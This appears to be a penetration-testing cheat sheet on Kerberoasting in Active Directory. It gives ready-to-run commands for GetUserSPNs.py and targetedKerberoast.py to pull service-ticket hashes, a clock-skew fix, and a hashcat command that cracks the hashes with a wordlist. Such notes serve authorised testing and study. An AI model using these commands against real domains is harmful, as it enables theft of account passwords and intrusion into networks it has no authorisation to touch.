## GetUserSPNs.py
GetUserSPNs.py queries DC for Active Directory user accounts that have Service Principal Names (SPNs) set.
These accounts often have Kerberos service tickets (TGS) that you can request and potentially crack offline to recover their plaintext password.
This is the basis of a Kerberoasting attack.

Specifically, the script:
- Authenticates to the DC using provided credentials.
- Queries LDAP for all user accounts with SPNs (servicePrincipalName attribute).
- Requests TGS tickets for those SPNs.
- Dumps the tickets in a hash format (Kerberos 5 TGS-REP hashes) suitable for offline cracking (e.g., with hashcat or john).
```
# Add domain to /etc/hosts so it resolves
GetUserSPNs.py <domain>/<user>:<password> -request -save
```

## TargetedKerberos.py
Useful for abusing certain Bloodhound edges.

https://github.com/ShutdownRepo/targetedKerberoast.git
```
targetedKerberoast.py -v -d '<domain>' -u '<Owned USer>' -p '<password>'
```
In case of below error
```
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```
Simply do
```
sudo ntpdate <Domain controller>
```
Crack the hash using hashcat
```
hashcat -a 0 -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```
